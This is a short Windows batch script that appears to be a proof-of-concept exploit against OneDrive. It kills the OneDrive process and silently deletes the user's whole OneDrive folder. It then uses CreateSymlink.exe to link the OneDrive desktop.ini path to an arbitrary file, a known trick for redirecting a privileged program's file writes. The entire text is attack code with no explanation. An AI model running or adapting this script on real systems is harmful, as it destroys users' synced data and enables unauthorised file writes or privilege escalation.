@echo off
taskkill /F /IM OneDrive.exe
timeout /t 5
set onedrivepath=%USERPROFILE%\OneDrive
set onedrivedesktopini=%USERPROFILE%\OneDrive\desktop.ini
rd %onedrivepath% /Q /S
mkdir C:\test
CreateSymlink.exe -p %onedrivedesktopini% C:\test\test.txt
echo "Done."